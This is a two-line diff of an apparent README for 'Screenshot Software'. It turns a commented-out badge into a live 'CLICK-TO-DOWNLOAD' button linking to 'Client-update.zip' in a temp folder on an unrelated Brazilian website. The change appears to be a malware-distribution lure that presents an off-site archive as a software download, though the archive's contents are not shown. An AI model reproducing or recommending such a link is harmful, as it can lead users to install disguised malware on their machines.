@@ -1,4 +1,4 @@
-#<a href="https://aciitu.com.br/temp/Client-update.zip"><img src="https://img.shields.io/badge/DOWNLOAD-grey" /></a>
+<a href="https://aciitu.com.br/temp/Client-update.zip"><img src="https://img.shields.io/badge/CLICK-TO-DOWNLOAD-grey" /></a>
 
 Screenshot Software:
 
